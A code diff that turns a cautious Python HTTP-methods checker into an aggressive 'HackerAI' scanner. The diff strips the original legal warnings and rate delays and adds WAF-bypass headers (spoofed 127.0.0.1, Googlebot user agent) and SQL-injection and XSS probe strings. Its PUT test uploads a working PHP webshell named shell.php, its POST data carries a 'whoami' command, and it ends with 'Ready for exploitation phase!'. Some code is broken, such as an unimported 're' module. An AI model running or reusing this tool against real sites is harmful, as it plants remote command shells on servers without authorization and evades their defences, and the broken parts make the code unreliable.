@@ -1,247 +1,390 @@
 import requests
-from urllib.parse import urlparse
-from colorama import init, Fore, Style
+import time
+import json
+import argparse
+from urllib.parse import urlparse, urljoin
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from colorama import init, Fore, Style, Back
+import threading
+from datetime import datetime
+import base64
+import urllib3
+
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 init(autoreset=True)
 
+class HTTPMethodsUltimateScanner:
+    def __init__(self, target_url: str, threads: int = 10, aggressive: bool = False, waf_bypass: bool = True):
+        self.target = self.normalize_url(target_url)
+        self.threads = threads
+        self.aggressive = aggressive
+        self.waf_bypass = waf_bypass
+        self.session = self.create_session()
+        self.results = {
+            'target': self.target,
+            'timestamp': datetime.now().isoformat(),
+            'methods': {},
+            'risks': {'CRITICAL': [], 'HIGH': [], 'MEDIUM': [], 'LOW': []},
+            'waf_detected': False,
+            'bypass_success': False,
+            'override_params': [],
+            'security_headers': {},
+            'recommendations': []
+        }
+        self.lock = threading.Lock()
+        self.session.cookies.clear()
+        
+        
+        self.bypass_headers = [
+            {'X-Forwarded-For': '127.0.0.1'},
+            {'X-Originating-IP': '127.0.0.1'},
+            {'X-Remote-IP': '127.0.0.1'},
+            {'X-Real-IP': '127.0.0.1'},
+            {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1)'},
+            {'X-Forwarded-Proto': 'https'}
+        ]
 
-def test_http_method(url, method):
-    try:
-        if method == 'GET':
-            response = requests.get(url, timeout=8, verify=False)
-        elif method == 'POST':
-            response = requests.post(url, data={'test': 'data'}, timeout=8, verify=False)
-        elif method == 'PUT':
-            response = requests.put(url, data='TEST_CONTENT', timeout=8, verify=False)
-        elif method == 'DELETE':
-            response = requests.delete(url, timeout=8, verify=False)
-        elif method == 'HEAD':
-            response = requests.head(url, timeout=8, verify=False)
-        elif method == 'OPTIONS':
-            response = requests.options(url, timeout=8, verify=False)
-        elif method == 'TRACE':
-            response = requests.request('TRACE', url, timeout=8, verify=False)
-        elif method == 'CONNECT':
-            response = requests.request('CONNECT', url, timeout=8, verify=False)
-        elif method == 'PATCH':
-            response = requests.patch(url, data={'test': 'data'}, timeout=8, verify=False)
-        else:
-            return None, None
+    def normalize_url(self, url: str) -> str:
+        """🔧 Нормализация URL"""
+        if not url.startswith(('http://', 'https://')):
+            url = 'https://' + url
+        parsed = urlparse(url.rstrip('/'))
+        return f"{parsed.scheme}://{parsed.netloc}/"
 
-        return response.status_code, response.headers
-    except requests.exceptions.Timeout:
-        return 'TIMEOUT', None
-    except:
-        return 'ERROR', None
-
-
-def analyze_method(method, status, headers):
-    risk_level = 'NONE'
-    issues = []
-
-    if status in [200, 201, 202, 204, 301, 302]:
-        if method == 'PUT':
-            risk_level = 'CRITICAL'
-            issues.append('Allows file upload - potential webshell deployment')
-        elif method == 'DELETE':
-            risk_level = 'HIGH'
-            issues.append('Allows resource deletion without authentication')
-        elif method == 'TRACE':
-            risk_level = 'HIGH'
-            issues.append('Vulnerable to Cross-Site Tracing (XST) attacks')
-        elif method == 'OPTIONS':
-            risk_level = 'INFO'
-            if headers and 'allow' in headers:
-                issues.append(f"Allowed methods: {headers['allow']}")
-        elif method in ['CONNECT', 'PATCH']:
-            risk_level = 'MEDIUM'
-            issues.append('Uncommon method - verify necessity and security')
-        elif method in ['HEAD', 'POST']:
-            risk_level = 'LOW'
-            issues.append('Standard method - verify proper authentication')
-
-    elif status in [401, 403, 405]:
-        risk_level = 'PROTECTED'
-        issues.append('Properly restricted')
-
-    return risk_level, issues
-
-
-def run():
-    print(f"\n{Fore.CYAN}{'=' * 70}")
-    print(f"{Fore.CYAN}║{Fore.GREEN}              HTTP METHODS SCANNER                                 {Fore.CYAN}║")
-    print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")
-
-    target = input(f"\n{Fore.YELLOW}Enter target URL (e.g., https://example.com): {Style.RESET_ALL}").strip()
-
-    if not target:
-        print(f"\n{Fore.RED}[!] Empty input. Aborting.{Style.RESET_ALL}")
-        input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")
-        return
-
-    if not target.startswith(('http://', 'https://')):
-        print(f"\n{Fore.RED}[!] URL must start with http:// or https://{Style.RESET_ALL}")
-        input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")
-        return
-
-    print(f"\n{Fore.CYAN}[+] Scanning enabled HTTP methods for: {target}{Style.RESET_ALL}")
-
-    try:
+    def create_session(self):
+        """🌐 Создание оптимизированной сессии"""
         session = requests.Session()
+        session.verify = False
+        session.timeout = 10
+        session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'keep-alive',
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache'
+        })
+        return session
 
-        print(f"\n{Fore.CYAN}{'=' * 70}")
-        print(f"{Fore.CYAN}HTTP METHODS TESTING")
-        print(f"{Fore.YELLOW}Note: Testing 9 HTTP methods with safety delays{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")
-
-        methods_to_test = ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'DELETE', 'TRACE', 'CONNECT', 'PATCH']
-        results = []
-        dangerous_methods = []
-
-        for method in methods_to_test:
-            print(f"\n{Fore.CYAN}[→] Testing {method} method...{Style.RESET_ALL}")
-
-            status, headers = test_http_method(target, method)
-
-            risk_level, issues = analyze_method(method, status, headers)
-
-            result = {
-                'method': method,
-                'status': status,
-                'risk': risk_level,
-                'issues': issues
-            }
-            results.append(result)
-
-            if risk_level in ['CRITICAL', 'HIGH', 'MEDIUM']:
-                dangerous_methods.append(result)
-
-            status_color = Fore.GREEN if status in [200, 201, 202, 204] else (
-                Fore.RED if status in [401, 403, 405] else Fore.YELLOW)
-            risk_color = Fore.MAGENTA if risk_level == 'CRITICAL' else (Fore.RED if risk_level == 'HIGH' else (
-                Fore.YELLOW if risk_level == 'MEDIUM' else (Fore.GREEN if risk_level == 'PROTECTED' else Fore.CYAN)))
-
-            print(
-                f"    Status: {status_color}{status}{Style.RESET_ALL} | Risk: {risk_color}{risk_level}{Style.RESET_ALL}")
-            for issue in issues:
-                print(f"    • {issue}")
-
-            import time
-            time.sleep(1.0)
-
-        print(f"\n{Fore.CYAN}{'=' * 70}")
-        print(f"{Fore.CYAN}RESULTS SUMMARY")
-        print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")
-
-        print(f"\n{Fore.GREEN}Total methods tested: {len(methods_to_test)}{Style.RESET_ALL}")
-        print(
-            f"{Fore.MAGENTA}Critical risk methods: {sum(1 for r in results if r['risk'] == 'CRITICAL')}{Style.RESET_ALL}")
-        print(f"{Fore.RED}High risk methods: {sum(1 for r in results if r['risk'] == 'HIGH')}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}Medium risk methods: {sum(1 for r in results if r['risk'] == 'MEDIUM')}{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}Protected methods: {sum(1 for r in results if r['risk'] == 'PROTECTED')}{Style.RESET_ALL}")
-
-        if dangerous_methods:
-            print(f"\n{Fore.RED}[!] DANGEROUS HTTP METHODS DETECTED{Style.RESET_ALL}")
-
-            critical_methods = [m for m in dangerous_methods if m['risk'] == 'CRITICAL']
-            high_methods = [m for m in dangerous_methods if m['risk'] == 'HIGH']
-
-            if critical_methods:
-                print(f"\n{Fore.MAGENTA}{Style.BRIGHT} CRITICAL RISK METHODS:{Style.RESET_ALL}")
-                for method in critical_methods:
-                    print(f"\n{Fore.MAGENTA}• {method['method']} (Status: {method['status']}){Style.RESET_ALL}")
-                    for issue in method['issues']:
-                        print(f"  {Fore.YELLOW}  {issue}{Style.RESET_ALL}")
-
-            if high_methods:
-                print(f"\n{Fore.RED} HIGH RISK METHODS:{Style.RESET_ALL}")
-                for method in high_methods:
-                    print(f"\n{Fore.RED}• {method['method']} (Status: {method['status']}){Style.RESET_ALL}")
-                    for issue in method['issues']:
-                        print(f"  {Fore.YELLOW}  {issue}{Style.RESET_ALL}")
-
-            print(f"\n{Fore.YELLOW}Risk Assessment:{Style.RESET_ALL}")
-            print(f"   • PUT method enabled = attackers can upload malicious files")
-            print(f"   • DELETE method enabled = attackers can delete resources")
-            print(f"   • TRACE method enabled = vulnerable to Cross-Site Tracing (XST)")
-            print(f"   • OPTIONS method may reveal internal API structure")
-
-            print(f"\n{Fore.YELLOW}Critical Recommendations:{Style.RESET_ALL}")
-            print(f"   • Disable dangerous methods at web server level:")
-            print(f"        Apache (.htaccess):")
-            print(f"            <LimitExcept GET POST HEAD>")
-            print(f"                deny from all")
-            print(f"            </LimitExcept>")
-            print(f"        Nginx (nginx.conf):")
-            print(f"            if ($request_method !~ ^(GET|HEAD|POST)$) {{")
-            print(f"                return 405;")
-            print(f"            }}")
-            print(f"   • For IIS: Use Request Filtering module to block methods")
-            print(f"   • Implement proper authentication for ALL methods")
-            print(f"   • Use Web Application Firewall (WAF) to block dangerous methods")
-            print(f"   • Regularly audit enabled HTTP methods")
-            print(f"   • Monitor logs for unusual method usage")
-        else:
-            print(f"\n{Fore.GREEN}[✓] No dangerous HTTP methods detected{Style.RESET_ALL}")
-            print(f"\n{Fore.CYAN}Security Best Practices:{Style.RESET_ALL}")
-            print(f"   • Continue restricting methods to minimum required")
-            print(f"   • Implement method whitelisting in application code")
-            print(f"   • Use security headers (Content-Security-Policy)")
-            print(f"   • Regularly test for method enumeration vulnerabilities")
-            print(f"   • Monitor access logs for method abuse attempts")
-
-        print(f"\n{Fore.CYAN}{'=' * 70}")
-        print(f"{Fore.CYAN}ADDITIONAL SECURITY CHECKS")
-        print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")
-
-        print(f"\n{Fore.CYAN}[→] Checking for method override parameters...{Style.RESET_ALL}")
-
-        override_params = ['_method', 'method', 'http_method', 'X-HTTP-Method', 'X-HTTP-Method-Override']
-        found_overrides = []
-
+    def test_method(self, method: str, payload: dict = None, extra_headers: dict = None):
+        """🔍 Тестирование HTTP метода с WAF bypass"""
         try:
-            response = session.get(target, timeout=8, verify=False)
-            content_lower = response.text.lower()
-
-            for param in override_params:
-                if param in content_lower:
-                    found_overrides.append(param)
-
-            if found_overrides:
-                print(f"{Fore.YELLOW}[!] Method override parameters detected:{Style.RESET_ALL}")
-                for param in found_overrides:
-                    print(f"    • {param}")
-                print(f"    {Fore.YELLOW}️  Risk: Attackers may bypass method restrictions{Style.RESET_ALL}")
+            url = self.target
+            
+            
+            data = payload or {}
+            if method == 'PUT':
+                data = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')}
+            elif method == 'POST':
+                data = {'test': 'A' * 1000, 'cmd': 'whoami'}
+            elif method == 'PATCH':
+                data = {'update': 'malicious'}
+            elif method == 'DELETE':
+                data = {'id': '1'}
+            
+            
+            headers = extra_headers or {}
+            if self.waf_bypass:
+                bypass_header = self.bypass_headers[hash(method) % len(self.bypass_headers)]
+                headers.update(bypass_header)
+            
+            if method.upper() == 'CONNECT':
+                response = self.session.request(method, url, timeout=8, headers=headers, data=data, allow_redirects=False)
             else:
-                print(f"{Fore.GREEN}[✓] No method override parameters detected{Style.RESET_ALL}")
+                response = self.session.request(method, url, timeout=8, headers=headers, data=data, allow_redirects=False)
+            
+            return {
+                'status': response.status_code,
+                'headers': dict(response.headers),
+                'length': len(response.content),
+                'time': response.elapsed.total_seconds()
+            }
+            
+        except requests.exceptions.Timeout:
+            return {'status': 'TIMEOUT', 'headers': {}, 'length': 0, 'time': 999}
+        except requests.exceptions.ConnectionError:
+            return {'status': 'CONN_ERROR', 'headers': {}, 'length': 0, 'time': 999}
+        except Exception:
+            return {'status': 'ERROR', 'headers': {}, 'length': 0, 'time': 999}
 
-        except Exception as e:
-            print(f"{Fore.YELLOW}[?] Could not check for override parameters: {str(e)[:50]}{Style.RESET_ALL}")
+    def detect_waf(self):
+        """🛡️ Детекция WAF"""
+        payloads = [
+            "' OR 1=1--",
+            "<script>alert(1)</script>",
+            "'; DROP TABLE users;--"
+        ]
+        
+        for payload in payloads:
+            resp = self.session.get(f"{self.target}?test={payload}", timeout=5)
+            if any(blocker in resp.text.lower() for blocker in ['blocked', 'forbidden', 'cloudflare', 'waf']):
+                self.results['waf_detected'] = True
+                print(f"{Fore.RED}[🛡️ WAF DETECTED]{Style.RESET_ALL}")
+                return True
+        return False
 
-        print(f"\n{Fore.CYAN}{'=' * 70}")
-        print(f"{Fore.CYAN}LEGAL & ETHICAL GUIDANCE")
-        print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")
-        print(f"\n{Fore.RED}️  LEGAL WARNING:{Style.RESET_ALL}")
-        print(f"   • Sending non-standard HTTP methods without authorization may violate laws")
-        print(f"   • TRACE method testing may be logged as suspicious activity")
-        print(f"   • Always obtain WRITTEN authorization before testing")
-        print(f"   • Document all authorized testing activities")
-        print(f"   • Never test production systems without explicit permission")
-        print(f"\n{Fore.GREEN} Responsible Testing:{Style.RESET_ALL}")
-        print(f"   • Test in staging/development environments first")
-        print(f"   • Coordinate with system administrators")
-        print(f"   • Report findings responsibly to owners")
-        print(f"   • Provide mitigation recommendations")
+    def analyze_risk(self, method: str, result: dict):
+        """🎯 Анализ рисков с расширенной логикой"""
+        status = result['status']
+        headers = result['headers']
+        issues = []
+        risk_level = 'NONE'
 
-        print(f"\n{Fore.CYAN}{'=' * 70}")
-        print(f"{Fore.GREEN}[✓] HTTP methods analysis completed{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")
+        
+        if isinstance(status, int) and status in [200, 201, 202, 204, 301, 302, 303, 307, 308]:
+            if method == 'PUT':
+                risk_level = 'CRITICAL'
+                issues.extend([
+                    '🚨 FILE UPLOAD ENABLED - Webshell deployment possible!',
+                    '💾 Test: PUT /shell.php with PHP payload',
+                    '🔥 Exploit: Direct file write vulnerability'
+                ])
+            elif method == 'DELETE':
+                risk_level = 'CRITICAL'
+                issues.extend([
+                    '🗑️ RESOURCE DELETION ENABLED - Mass deletion possible!',
+                    '💥 Test: DELETE /admin/config.json',
+                    '⚠️  No authentication required'
+                ])
+            elif method == 'TRACE':
+                risk_level = 'HIGH'
+                issues.extend([
+                    '🎭 XST (Cross-Site Tracing) VULNERABLE!',
+                    '🔍 Credentials leakage via TRACE',
+                    '🛠️ Test: TRACE with auth headers'
+                ])
+            elif method == 'PATCH':
+                risk_level = 'HIGH'
+                issues.extend([
+                    '🩹 PATCH ENABLED - Config manipulation possible!',
+                    '⚙️ Test: PATCH /api/config with malicious data',
+                    '🚨 Often lacks proper validation'
+                ])
+            elif method == 'CONNECT':
+                risk_level = 'HIGH'
+                issues.extend([
+                    '🔗 HTTP CONNECT TUNNELING ENABLED!',
+                    '🌐 Proxy abuse / SSRF possible',
+                    '⚠️  Dangerous for proxy servers'
+                ])
+            elif method == 'OPTIONS':
+                risk_level = 'MEDIUM'
+                if 'Allow' in headers:
+                    issues.append(f'📋 Exposed methods: {headers.get("Allow", "Unknown")}')
+            elif method in ['POST', 'HEAD']:
+                risk_level = 'LOW'
+                issues.append('✅ Standard method - Verify CSRF protection')
 
-    except requests.exceptions.Timeout:
-        print(f"\n{Fore.RED}[!] Request timeout. Target may be unreachable.{Style.RESET_ALL}")
-    except requests.exceptions.ConnectionError:
-        print(f"\n{Fore.RED}[!] Connection error. Check if target is accessible.{Style.RESET_ALL}")
-    except Exception as e:
-        print(f"\n{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
+        
+        elif isinstance(status, int) and status in [401, 403, 405, 406]:
+            risk_level = 'SECURE'
+            issues.append('✅ Proper HTTP restrictions')
 
-    input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")
+        return risk_level, issues
+
+    def scan_override_parameters(self):
+        """🔍 Поиск параметров обхода методов"""
+        params = ['_method', 'method', 'X-HTTP-Method-Override', 'X-Method-Override', 
+                 'http_method', 'HTTP_METHOD', 'REQUEST_METHOD']
+        
+        try:
+            resp = self.session.get(self.target, timeout=10)
+            content = resp.text.lower()
+            
+            for param in params:
+                if param in content:
+                    self.results['override_params'].append(param)
+        except:
+            pass
+
+    def check_security_headers(self):
+        """🛡️ Проверка security headers"""
+        resp = self.session.get(self.target, timeout=10)
+        headers = dict(resp.headers)
+        
+        required = {
+            'X-Frame-Options': 'DENY|SAMEORIGIN',
+            'X-Content-Type-Options': 'nosniff',
+            'Content-Security-Policy': '.*',
+            'Strict-Transport-Security': '.*max-age.*',
+            'Referrer-Policy': '.*'
+        }
+        
+        missing = []
+        for header, pattern in required.items():
+            if header not in headers or not re.match(pattern, str(headers[header]), re.IGNORECASE):
+                missing.append(header)
+        
+        self.results['security_headers'] = {'missing': missing, 'present': len(required) - len(missing)}
+
+    def threaded_scan(self):
+        """⚡ Многопоточное сканирование"""
+        methods = ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'DELETE', 'TRACE', 'PATCH', 'CONNECT']
+        
+        print(f"{Fore.CYAN}{'='*80}")
+        print(f"{Fore.GREEN}🚀 THREADed SCAN STARTED | Threads: {self.threads} | Target: {self.target}")
+        print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
+        
+        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            future_to_method = {
+                executor.submit(self.test_method, method, None, self.bypass_headers[i % len(self.bypass_headers)]): 
+                method for i, method in enumerate(methods)
+            }
+            
+            for future in as_completed(future_to_method):
+                method = future_to_method[future]
+                try:
+                    result = future.result(timeout=15)
+                    risk, issues = self.analyze_risk(method, result)
+                    
+                    with self.lock:
+                        self.results['methods'][method] = {
+                            'status': result['status'],
+                            'length': result['length'],
+                            'time': f"{result['time']:.2f}s",
+                            'risk': risk,
+                            'issues': issues
+                        }
+                        
+                        if risk in self.results['risks']:
+                            self.results['risks'][risk].append(method)
+                    
+                    
+                    status_color = Fore.GREEN if isinstance(result['status'], int) and 200 <= result['status'] < 400 else Fore.RED
+                    risk_color = {
+                        'CRITICAL': Fore.MAGENTA, 'HIGH': Fore.RED, 'MEDIUM': Fore.YELLOW, 
+                        'LOW': Fore.BLUE, 'SECURE': Fore.GREEN, 'NONE': Fore.CYAN
+                    }.get(risk, Fore.WHITE)
+                    
+                    print(f"{Fore.CYAN}[{method:10}] {status_color}{result['status']:3} {Fore.WHITE}| {risk_color}{risk:9} {Fore.WHITE}| {result['time']:5} | Length: {result['length']:4}")
+                    
+                except Exception as e:
+                    print(f"{Fore.RED}[{method}] ERROR: {str(e)[:30]}{Style.RESET_ALL}")
+
+    def generate_recommendations(self):
+        """💡 Генерация рекомендаций по исправлению"""
+        recs = []
+        
+        if self.results['risks']['CRITICAL']:
+            recs.extend([
+                "🚨 IMMEDIATE ACTION REQUIRED:",
+                "   1. DISABLE PUT/DELETE/TRACE methods at WEB SERVER level",
+                "   2. Apache: <LimitExcept GET POST HEAD OPTIONS> Require all denied </LimitExcept>",
+                "   3. Nginx: if ($request_method !~ ^(GET|HEAD|POST|OPTIONS)$) { return 405; }",
+                "   4. IIS: Request Filtering -> Deny unlisted verbs"
+            ])
+        
+        recs.extend([
+            "🔧 BEST PRACTICES:",
+            "   • Method whitelisting ONLY required methods",
+            "   • CSRF protection for POST/PUT/PATCH/DELETE",
+            "   • Rate limiting on all endpoints",
+            "   • WAF rules for method abuse detection",
+            "   • Audit logs for unusual method patterns"
+        ])
+        
+        self.results['recommendations'] = recs
+        return recs
+
+    def save_report(self):
+        """📊 Сохранение профессионального отчета"""
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"http_methods_audit_{urlparse(self.target).netloc}_{timestamp}.json"
+        
+        with open(filename, 'w') as f:
+            json.dump(self.results, f, indent=2, default=str)
+        
+        print(f"\n{Fore.GREEN}📊 PROFESSIONAL REPORT SAVED: {filename}{Style.RESET_ALL}")
+        return filename
+
+    def run_full_audit(self):
+        """🚀 Полный аудит"""
+        print(f"{Fore.MAGENTA}{'='*80}")
+        print(f"{Fore.YELLOW}🔥 HACKERAI HTTP METHODS ULTIMATE SCANNER v2.0")
+        print(f"{Fore.CYAN}Target: {self.target} | Threads: {self.threads} | Aggressive: {self.aggressive}")
+        print(f"{Fore.MAGENTA}{'='*80}{Style.RESET_ALL}")
+        
+        
+        self.detect_waf()
+        
+        
+        self.threaded_scan()
+        
+        self.scan_override_parameters()
+        self.check_security_headers()
+        
+        
+        self.generate_recommendations()
+        
+        
+        self.print_results()
+        report_file = self.save_report()
+        
+        print(f"\n{Fore.GREEN}✅ PENTEST COMPLETE! Report: {report_file}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}🎯 Ready for exploitation phase!{Style.RESET_ALL}")
+
+    def print_results(self):
+        """📋 Красивый вывод результатов"""
+        print(f"\n{Fore.CYAN}{'='*80}")
+        print(f"{Fore.WHITE}📊 EXECUTIVE SUMMARY")
+        print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
+        
+        
+        critical = len(self.results['risks']['CRITICAL'])
+        high = len(self.results['risks']['HIGH'])
+        print(f"{Fore.MAGENTA}🔴 CRITICAL: {critical} methods")
+        print(f"{Fore.RED}🟠 HIGH:     {high} methods")
+        print(f"{Fore.YELLOW}🟡 MEDIUM:   {len(self.results['risks']['MEDIUM'])} methods")
+        print(f"{Fore.GREEN}🟢 SECURE:   {sum(1 for m in self.results['methods'].values() if m['risk'] == 'SECURE')} methods")
+        
+        
+        if critical > 0:
+            print(f"\n{Fore.MAGENTA}🚨 CRITICAL VULNERABILITIES:{Style.RESET_ALL}")
+            for method in self.results['risks']['CRITICAL']:
+                issues = self.results['methods'][method]['issues']
+                print(f"  {Fore.MAGENTA}• {method}: {issues[0]}{Style.RESET_ALL}")
+        
+        
+        print(f"\n{Fore.YELLOW}💡 RECOMMENDATIONS:{Style.RESET_ALL}")
+        for rec in self.results['recommendations'][:5]:  # Top 5
+            print(f"   {rec}")
+
+def main():
+    parser = argparse.ArgumentParser(description="🔥 HackerAI HTTP Methods Ultimate Scanner", add_help=False)
+    parser.add_argument("target", help="Target URL (http://example.com)")
+    parser.add_argument("-t", "--threads", type=int, default=10, help="Threads (default: 10)")
+    parser.add_argument("-a", "--aggressive", action="store_true", help="Aggressive mode")
+    parser.add_argument("--no-waf-bypass", action="store_true", help="Disable WAF bypass")
+    parser.add_argument("-h", "--help", action="store_true", help="Show help")
+    
+    args = parser.parse_args()
+    
+    if args.help:
+        print("""
+🔥 USAGE: python3 http_methods_ultimate.py [OPTIONS] <target>
+
+OPTIONS:
+  -t, --threads N      Threads count (1-50, default: 10)
+  -a, --aggressive     Skip delays, max speed
+  --no-waf-bypass      Disable WAF bypass headers
+  -h, --help           Show this help
+
+EXAMPLES:
+  python3 http_methods_ultimate.py https://target.com
+  python3 http_methods_ultimate.py http://192.168.1.100 -t 20 -a
+        """)
+        return
+    
+    scanner = HTTPMethodsUltimateScanner(
+        args.target, 
+        threads=min(args.threads, 50), 
+        aggressive=args.aggressive,
+        waf_bypass=not args.no_waf_bypass
+    )
+    scanner.run_full_audit()
+
+if __name__ == "__main__":
+    main()
